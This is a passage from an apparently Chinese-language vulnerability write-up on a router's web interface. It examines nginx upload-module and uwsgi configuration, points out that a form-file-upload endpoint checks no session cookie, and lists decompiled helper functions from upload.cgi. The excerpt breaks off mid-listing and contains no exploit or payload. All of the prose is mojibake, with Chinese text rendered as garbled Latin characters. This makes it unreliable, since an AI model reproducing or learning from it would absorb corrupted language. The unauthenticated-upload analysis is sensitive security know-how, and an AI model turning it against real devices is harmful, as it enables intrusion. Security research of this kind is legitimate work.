&quot;$upload_file_name&quot;;</span><br><span class="line">upload_set_form_field $upload_field_name<span class="selector-class">.content_type</span> &quot;$upload_content_type&quot;;</span><br><span class="line">upload_set_form_field $upload_field_name<span class="selector-class">.path</span> &quot;$upload_tmp_path&quot;;</span><br><span class="line">upload_aggregate_form_field &quot;$upload_field_name<span class="selector-class">.md5</span>&quot; &quot;$upload_file_md5&quot;;</span><br><span class="line">upload_aggregate_form_field &quot;$upload_field_name<span class="selector-class">.size</span>&quot; &quot;$upload_file_size&quot;;</span><br><span class="line">upload_pass_form_field &quot;^.*$&quot;;</span><br><span class="line">upload_cleanup <span class="number">400</span> <span class="number">404</span> <span class="number">499</span> <span class="number">500</span>-<span class="number">505</span>;</span><br><span class="line">upload_resumable on;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>locationå—çš„ä¸»è¦ä½œç”¨æ˜¯ åŸºäºNginxæœåŠ¡å™¨æ¥æ”¶åˆ°çš„å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚&#x2F;api&#x2F;operations&#x2F;ciscosb-file:form-file-uploadï¼‰ï¼Œå¯¹é™¤è™šæ‹Ÿä¸»æœºåç§°ä¹‹å¤–çš„å­—ç¬¦ä¸²è¿›è¡ŒåŒ¹é…ï¼Œå¯¹ç‰¹å®šçš„è¯·æ±‚è¿›è¡Œå¤„ç†ã€‚åœ°å€å®šå‘ã€æ•°æ®ç¼“å­˜å’Œåº”ç­”æ§åˆ¶ç­‰åŠŸèƒ½éƒ½æ˜¯åœ¨è¿™éƒ¨åˆ†å®ç°</p><p>åœ¨Nginxçš„å®˜æ–¹æ–‡æ¡£ä¸­å®šä¹‰çš„locationçš„è¯­æ³•ç»“æ„ä¸ºï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location <span class="selector-attr">[ = | ~ | ~* | ^~ ]</span> uri &#123; ... &#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­uriå°±æ˜¯æˆ‘ä»¬çš„&#x2F;apiâ€¦.é‚£ä¸€ä¸²ï¼Œå®ƒä¹Ÿå¯ä»¥å«æ­£åˆ™è¡¨è¾¾</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ($http_authorization != &quot;&quot;) &#123;</span><br><span class="line">    set $deny &quot;<span class="number">0</span>&quot;;</span><br><span class="line">&#125;</span><br><span class="line">if ($deny = &quot;<span class="number">1</span>&quot;) &#123;</span><br><span class="line">    return <span class="number">403</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒ¹é…å®Œæˆä¹‹åä¼šå¯¹http_authorizationè¿›è¡Œåˆ¤æ–­ï¼Œå…¨å±€æœç´¢è¿™ä¸ªå˜é‡å‘ç°åœ¨&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;proxy.confä¸­å¯¹å…¶è¿›è¡Œäº†å®šä¹‰</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331142.png" alt="image-20240811133551968"></p><p>å› æ­¤å°±æ˜¯å¯¹Authorizationè¿™ä¸ªç¯å¢ƒå˜é‡è¿›è¡Œåˆ¤å®šï¼ŒçŒœæµ‹æ˜¯èº«ä»½è¯æ˜ï¼Œå¦‚æœæ²¡æœ‰çš„è¯å°±ä¼š403æŠ¥é”™</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">upload_pass /form-file-upload;</span><br><span class="line">upload_store /tmp/upload;</span><br><span class="line">upload_store_access user:rw group:rw all:rw;</span><br><span class="line">upload_set_form_field $upload_field_name.name <span class="string">&quot;$upload_file_name&quot;</span>;</span><br><span class="line">upload_set_form_field $upload_field_name.content_type <span class="string">&quot;$upload_content_type&quot;</span>;</span><br><span class="line">upload_set_form_field $upload_field_name.path <span class="string">&quot;$upload_tmp_path&quot;</span>;</span><br><span class="line">upload_aggregate_form_field <span class="string">&quot;$upload_field_name.md5&quot;</span> <span class="string">&quot;$upload_file_md5&quot;</span>;</span><br><span class="line">upload_aggregate_form_field <span class="string">&quot;$upload_field_name.size&quot;</span> <span class="string">&quot;$upload_file_size&quot;</span>;</span><br><span class="line">upload_pass_form_field <span class="string">&quot;^.*$&quot;</span>;</span><br><span class="line">upload_cleanup <span class="number">400</span> <span class="number">404</span> <span class="number">499</span> <span class="number">500</span><span class="number">-505</span>;</span><br><span class="line">upload_resumable on;</span><br></pre></td></tr></table></figure><p>ä¹‹åä¾¿æ˜¯å¯¹nginx upload moduleé…ç½®å‚æ•°äº†</p><p><strong>upload_pass &#x2F;form-file-uploadï¼š</strong>æŒ‡æ˜äº†åç»­è¦å¤„ç†çš„phpæ–‡ä»¶ï¼Œè½¬åˆ°åç«¯å¤„ç†&#x2F;form-file-uploadè¿™ä¸ªå‚æ•°</p><p><strong>upload_store &#x2F;tmp&#x2F;uploadï¼š</strong>æŒ‡å®šäº†ä¸Šä¼ æ–‡ä»¶çš„å­˜æ”¾åœ°å€</p><p><strong>upload_store_access user:rw group:rw all:rwï¼š</strong>ä¸Šä¼ æ–‡ä»¶çš„è®¿é—®æƒé™ï¼Œæ‰€æœ‰äººéƒ½æ˜¯rw</p><p><strong>upload_set_form_field $upload_field_name.name â€œ$upload_file_nameâ€ï¼š</strong>è®¾ç½®å‚æ•°</p><p><strong>upload_pass_form_field â€œ^.*$â€ï¼š</strong>ä»è¡¨å•åŸæ ·è½¬åˆ°åç«¯å‚æ•°ï¼Œæ˜¯ä¸€ä¸ªæ­£åˆ™åŒ¹é…^è¡¨ç¤ºå¼€å§‹ï¼Œ.è¡¨ç¤ºä»»æ„å­—ç¬¦ï¼Œ*è¡¨ç¤ºå¯ä»¥å‡ºç°é›¶æ¬¡æˆ–å¤šæ¬¡ï¼Œ$æ˜¯ç»“æŸï¼Œå› æ­¤è¯´æ˜å¯ä»¥ä¸Šä¼ ä»»æ„å­—ç¬¦åˆ°åç«¯</p><p><strong>upload_cleanup 400 404 499 500-505ï¼š</strong>å¦‚æœå‡ºç°äº†400 404ç­‰è¿™äº›é”™è¯¯å°±åˆ é™¤æ‰€æœ‰ä¸Šä¼ çš„æ–‡ä»¶</p><p>åœ¨è¿™é‡Œæ²¡æœ‰å¯¹cookie_sessionidè¿›è¡Œåˆ¤æ–­</p><blockquote><p><code>cookie_sessionid</code></p><ul><li><strong>ç”¨é€”</strong>: å­˜å‚¨ç”¨æˆ·çš„ä¼šè¯æ ‡è¯†ç¬¦ã€‚</li><li><strong>ä½œç”¨</strong>: æœåŠ¡å™¨ä½¿ç”¨è¿™ä¸ªæ ‡è¯†ç¬¦æ¥è¯†åˆ«ç”¨æˆ·çš„ä¼šè¯çŠ¶æ€ï¼Œä¿æŒç”¨æˆ·ç™»å½•çŠ¶æ€ï¼Œæˆ–è·Ÿè¸ªç”¨æˆ·æ´»åŠ¨ã€‚</li></ul><p><code>Authorization</code></p><ul><li><strong>ç”¨é€”</strong>: åŒ…å«è®¤è¯å‡­æ®ã€‚</li><li><strong>ä½œç”¨</strong>: ç”¨äºå‘æœåŠ¡å™¨æä¾›ç”¨æˆ·çš„èº«ä»½ä¿¡æ¯ï¼Œé€šå¸¸åœ¨ HTTP è¯·æ±‚å¤´ä¸­ä½¿ç”¨ã€‚</li></ul></blockquote><p>æˆ‘å¯¹å…¶çš„ç†è§£å°±æ˜¯æ²¡ç™»é™†ï¼Œå°±èƒ½ä¸Šä¼ æ–‡ä»¶ï¼Œè¿™æˆ–è®¸ä¹Ÿæ˜¯ä¸€ç§æœªæˆæƒçš„åˆ¤å®šæ–¹æ³•ï¼Ÿ</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331143.png" alt="image-20240811140200582"></p><p>å¯ä»¥çœ‹åˆ°æ­£è§„çš„&#x2F;uploadæ˜¯å­˜åœ¨å¯¹cookie_sessionidçš„åˆ¤å®šçš„ï¼Œ($cookie_sessionid ~* â€œ^[a-f0-9]{64}â€)æ­£åˆ™åŒ¹é…è¦ç¡®ä¿å®ƒæ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ 64 ä½åå…­è¿›åˆ¶å­—ç¬¦ä¸²</p><p>ä¹‹åçœ‹&#x2F;form-file-uploadåˆ°åº•æ˜¯ä»€ä¹ˆ</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331144.png" alt="image-20240811140509385"></p><blockquote><p>includeæŒ‡ä»¤ï¼šç”¨äºåŒ…å«å…¶ä»–çš„é…ç½®æ–‡ä»¶</p></blockquote><p>å…¶ä¸­åŒ…å«äº†uwsgi_paramsè¿™ä¸ªé…ç½®æ–‡ä»¶ï¼Œåœ¨&#x2F;etc&#x2F;nginx&#x2F;uwsgi_paramsï¼Œæ˜¯ä¸€ç§ç”¨äº<em>é…ç½®</em>ä¸Nginx ä¹‹é—´çš„é€šä¿¡çš„æ–‡ä»¶ã€‚å®ƒå®šä¹‰äº†ä¸€äº›å˜é‡å’Œé€‰é¡¹ï¼Œä»¥ç¡®ä¿æ­£ç¡®åœ°ä¼ é€’è¯·æ±‚å’Œå“åº”ã€‚ç®—æ˜¯ä¸€ç§é€šç”¨é…ç½®</p><p>uwsgi_passæŒ‡å‘uwsgiæœåŠ¡å™¨IPå’Œç«¯å£ï¼Œè®¾ç½®è¯»å–å’Œå‘é€è¶…æ—¶æ—¶é—´ä¸º3600ç§’</p><p>è¯´æ˜äº†å®ƒæŠŠè¯·æ±‚å‘é€ç»™äº†uwsgiçš„æœåŠ¡å™¨æ¥å¤„ç†</p><p>é‚£ä¹ˆå¤„ç†çš„æ–‡ä»¶æ˜¯ä»€ä¹ˆï¼Œæˆ‘ä»¬å…ˆçœ‹nginxçš„å¯åŠ¨ç¨‹åº</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331145.png" alt="image-20240811142007666"></p><p>åœ¨æœ€åå¯åŠ¨äº†uwsgiç¨‹åº</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331146.png" alt="image-20240811142047541"></p><p>å¯ä»¥çœ‹åˆ°uwsgiçš„å¯åŠ¨ç¨‹åºæŒ‡å®šä¸º&#x2F;usr&#x2F;bin&#x2F;uwsgi-launcherç¨‹åº</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331147.png" alt="image-20240811142219102"></p><p>å®ƒæ‰§è¡Œäº†ä¸‰ä¸ªåˆå§‹åŒ–ç¨‹åºï¼Œåˆ†åˆ«çœ‹ä¸€ä¸‹</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line"><span class="attribute">plugins</span> = cgi</span><br><span class="line">workers = <span class="number">4</span></span><br><span class="line">master = <span class="number">1</span></span><br><span class="line">uid = www-data</span><br><span class="line">gid = www-data</span><br><span class="line">socket=<span class="number">127.0.0.1:9000</span></span><br><span class="line">buffer-size=<span class="number">4096</span></span><br><span class="line">cgi = /jsonrpc=/www/cgi-bin/jsonrpc.cgi</span><br><span class="line">cgi-allowed-ext = .cgi</span><br><span class="line">cgi-allowed-ext = .pl</span><br><span class="line">cgi-timeout = <span class="number">3600</span></span><br><span class="line">ignore-sigpipe = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯å¯ç”¨äº†CGiæ’ä»¶æ¥å¤„ç†CGIè„šæœ¬ï¼Œé…ç½®äº†å››ä¸ªå·¥ä½œè¿›ç¨‹æ¥å¤„ç†è¯·æ±‚ï¼Œå¯ç”¨äº†ä¸»è¿›ç¨‹ç®¡ç†å·¥ä½œè¿›ç¨‹ï¼Œè®¾ç½®èº«ä»½ï¼Œç›‘å¬9000ç«¯å£ï¼Œè®¾ç½®ç¼“å†²åŒºå¤§å°ä¸º4096ï¼Œå°† <code>/jsonrpc</code> è·¯å¾„æ˜ å°„åˆ° <code>/www/cgi-bin/jsonrpc.cgi</code> è„šæœ¬ï¼Œå…è®¸è¿è¡Œçš„ä¸º.cgi .plçš„æ‰©å±•åï¼Œå¿½ç•¥äº†signalä¿¡å·ã€‚æ€»ä¹‹å°±æ˜¯ç›‘å¬9000ç«¯å£ï¼Œè¿è¡Œcgiè„šæœ¬ã€‚æ¥ä¸‹æ¥çš„ä¸¤ä¸ªiniä¹Ÿæ˜¯å¦‚æ­¤ï¼Œå°±ä¸è¿‡å¤šèµ˜è¿°äº†ï¼Œä½†æ˜¯çœ‹åˆ°æˆ‘ä»¬ä¹‹å‰åˆ†æçš„&#x2F;uploadçš„uswgiæ˜¯å‘é€åˆ°9003ç«¯å£æ¥å¤„ç†è¯·æ±‚çš„ï¼Œå› æ­¤çœ‹åˆ°</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331148.png" alt="image-20240811142811028"></p><p>å‘ç°æ˜¯&#x2F;www&#x2F;cgi-bin&#x2F;upload-cgiæ¥å¤„ç†è¯·æ±‚çš„ï¼Œè°ƒç”¨çš„æ–¹å¼æ˜¯å…ˆ <code>fork</code> äº†ä¸€ä¸ªå­è¿›ç¨‹ï¼Œç„¶å <code>execvp</code> æ¥æ‰§è¡Œ <code>upload.cgi</code></p><h2 id="äºŒè¿›åˆ¶æ–‡ä»¶åˆ†æ"><a href="#äºŒè¿›åˆ¶æ–‡ä»¶åˆ†æ" class="headerlink" title="äºŒè¿›åˆ¶æ–‡ä»¶åˆ†æ"></a>äºŒè¿›åˆ¶æ–‡ä»¶åˆ†æ</h2><h3 id="StrBufç³»åˆ—å‡½æ•°"><a href="#StrBufç³»åˆ—å‡½æ•°" class="headerlink" title="StrBufç³»åˆ—å‡½æ•°"></a>StrBufç³»åˆ—å‡½æ•°</h3><p>åœ¨åˆ†æupload-cgiå‰è¦å…ˆçœ‹ä¸€äº›è‡ªå®šä¹‰å‡½æ•°çš„å®šä¹‰ï¼Œä¸ç„¶ä¼šè¾ƒéš¾åˆ†æ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *<span class="title">StrBufCreate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// r4</span></span><br><span class="line">  _BYTE *v1; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">malloc</span>(<span class="number">0xC</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v0[<span class="number">1</span>] = <span class="number">0x37</span>;</span><br><span class="line">    v1 = <span class="built_in">malloc</span>(<span class="number">0x37</span>u);</span><br><span class="line">    *v0 = v1;</span><br><span class="line">    <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(v0);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *v1 = <span class="number">0</span>;</span><br><span class="line">    v0[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>StrBufCreateå‡½æ•°ï¼Œæ²¡æœ‰å‚æ•°ï¼Œä½œç”¨æ˜¯åˆ›å»ºä¸€ä¸ªä¸‰ä¸ªåœ°å€é•¿åº¦çš„chunkï¼Œç„¶åç¬¬äºŒä¸ªé•¿åº¦å†™Bufçš„é•¿åº¦å³0x37ï¼Œä½ä¸‰ä¸ªé•¿åº¦æ˜¯0ï¼Œç¬¬ä¸€ä¸ªé•¿åº¦æ˜¯Bufçš„åœ°å€ï¼Œè¿˜ç®—æ˜¯æ¯”è¾ƒæ¸…æ™°çš„</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__fastcall <span class="title">StrBufAppendStr</span><span class="params">(_DWORD *a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// r5</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a2 || !<span class="built_in">StrBufIsOK</span>(a1) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(a2);</span><br><span class="line">  result = <span class="built_in">sub_1BBC</span>((<span class="type">void</span> **)a1, v5 + a1[<span class="number">2</span>] + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *)(*a1 + a1[<span class="number">2</span>]), a2);</span><br><span class="line">    result = &amp;dword_0 + <span class="number">1</span>;</span><br><span class="line">    a1[<span class="number">2</span>] += v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€»ä½“è€Œè¨€ï¼Œè¿™æ®µä»£ç å®ç°äº†ä¸€ä¸ªåŠ¨æ€å­—ç¬¦ä¸²ç¼“å†²åŒºçš„ç®¡ç†ï¼Œèƒ½å¤Ÿåœ¨åŸæœ‰å­—ç¬¦ä¸²çš„åŸºç¡€ä¸Šè¿½åŠ æ–°çš„å­—ç¬¦ä¸²ï¼ŒåŒæ—¶ç¡®ä¿åœ¨è¿½åŠ æ—¶æœ‰è¶³å¤Ÿçš„å†…å­˜ç©ºé—´ã€‚å¦‚æœå†…å­˜ä¸è¶³ï¼Œå®ƒä¼šè¿›è¡Œé‡æ–°åˆ†é…å¹¶å¤„ç†ç›¸å…³çš„å†…å­˜ç®¡ç†ã€‚</p><p>å¦‚æœæ„Ÿå…´è¶£å¯ä»¥è‡ªè¡Œåˆ†æ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">StrBufSetStr</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">StrBufClear</span>(a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">StrBufAppendStr</span>((_DWORD *)a1, (<span class="type">const</span> <span class="type">char</span> *)a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¾¿æ˜¯æ¸…é™¤a1ï¼Œç„¶åa2è¦†ç›–åœ¨a1é‡Œé¢ï¼Œå³å¯ä»¥ç†è§£ä¸ºèµ‹å€¼</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__fastcall <span class="title">StrBufToStr</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">StrBufIsOK</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="keyword">return</span> (_DWORD *)*a1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­æ˜¯å¦åˆæ³•ï¼Œå¦‚æœåˆæ³•åˆ™è¿”å›åœ°å€ï¼Œä¸åˆæ³•å°±è¿”å›é”™è¯¯ä¿¡æ¯</p><h3 id="jsonutilç³»åˆ—å‡½æ•°"><a href="#jsonutilç³»åˆ—å‡½æ•°" class="headerlink" title="jsonutilç³»åˆ—å‡½æ•°"></a>jsonutilç³»åˆ—å‡½æ•°</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">jsonutil_get_string</span><span class="params">(<span class="type">int</span> a1, _DWORD *a2, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  va_list varg_r2; <span class="comment">// [sp+10h] [bp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">va_start</span>(varg_r2, a2);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">jsonutil_vget</span>(a1, (<span class="type">int</span> *)varg_r2) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  *a2 = <span class="built_in">json_object_get_string</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•´ä½“æ¥çœ‹ï¼Œè¿™æ®µä»£ç çš„ç›®çš„æ˜¯ä»ä¸€ä¸ª JSON å¯¹è±¡ä¸­æå–å­—ç¬¦ä¸²ã€‚<code>jsonutil_get_string</code> å‡½æ•°è´Ÿè´£è°ƒç”¨ <code>jsonutil_vget</code> è¿›è¡Œå¤„ç†ï¼Œè€Œ <code>jsonutil_vget</code> åˆ™é€šè¿‡ä¸æ–­æ£€æŸ¥å’Œè·å– JSON å¯¹è±¡çš„å€¼ï¼Œæœ€ç»ˆè¿”å›ä¸€ä¸ªæœ‰æ•ˆçš„ç´¢å¼•æˆ–å¯¹è±¡ã€‚è‹¥æˆåŠŸè·å–å­—ç¬¦ä¸²ï¼Œåˆ™å°†å…¶å­˜å‚¨åœ¨ä¼ å…¥çš„æŒ‡é’ˆ <code>*a2</code> ä¸­ã€‚</p><h3 id="multiç³»åˆ—å‡½æ•°"><a href="#multiç³»åˆ—å‡½æ•°" class="headerlink" title="multiç³»åˆ—å‡½æ•°"></a>multiç³»åˆ—å‡½æ•°</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> *__fastcall <span class="title">multipart_parser_init</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">size_t</span> v6; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  v5 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">2</span> * v4 + <span class="number">37</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v5 + <span class="number">24</span>, a1);</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  *((_DWORD *)v5 + <span class="number">2</span>) = v6;</span><br><span class="line">  *((_DWORD *)v5 + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)v5 + <span class="number">5</span>) = &amp;v5[v6 + <span class="number">25</span>];</span><br><span class="line">  result = v5;</span><br><span class="line">  v5[<span class="number">12</span>] = <span class="number">2</span>;</span><br><span class="line">  *((_DWORD *)v5 + <span class="number">4</span>) = a2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç çš„åŠŸèƒ½æ˜¯ä¸ºä¸€ä¸ªå¤šéƒ¨åˆ†è§£æå™¨åˆ†é…å†…å­˜å¹¶åˆå§‹åŒ–å…¶çŠ¶æ€ï¼ŒåŒ…æ‹¬å­˜å‚¨è¾“å…¥å­—ç¬¦ä¸²åŠå…¶é•¿åº¦ã€è®¾ç½®ä¸€äº›çŠ¶æ€å­—æ®µç­‰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">multipart_parser_execute</span>(v12, v8, v13);è¯¥å‡½æ•°æºç è¿‡é•¿å°±ä¸è´´äº†</span><br></pre></td></tr></table></figure><p>ä¸»è¦çš„ä½œç”¨å¯èƒ½æ˜¯ç”¨äºè§£æHTTPè¯·æ±‚ä¸­çš„<code>multipart/form-data</code>ï¼Œä½†æ˜¯ç”±äºå¯æ§æ®µä¸åœ¨è¿™é‡Œå°±ä¸è¿‡å¤šçš„åˆ†æäº†ï¼Œè¯¦ç»†è¯·çœ‹ä¸‹æ–‡</p><p><strong>åˆ†æåˆ°è¿™é‡Œï¼Œæˆ‘è®¤ä¸ºè¿™äº›å‡½æ•°ï¼Œæƒ³å¿…æ˜¯ç½‘ä¸Šå¼€æºçš„å‡½æ•°ï¼Œå¤§æ¦‚ç‡æ˜¯æ²¡æœ‰ä»€ä¹ˆæ¼æ´å¯è¨€çš„ï¼Œå› æ­¤ä¸»è¦çœ‹å‡½æ•°çš„ä½œç”¨ä»¥åŠä¸»å‡½æ•°çš„é€»è¾‘æ¼æ´</strong></p><h3 id="cgiæ–‡ä»¶åˆ†æ"><a href="#cgiæ–‡ä»¶åˆ†æ" class="headerlink" title=".cgiæ–‡ä»¶åˆ†æ"></a>.cgiæ–‡ä»¶åˆ†æ</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span 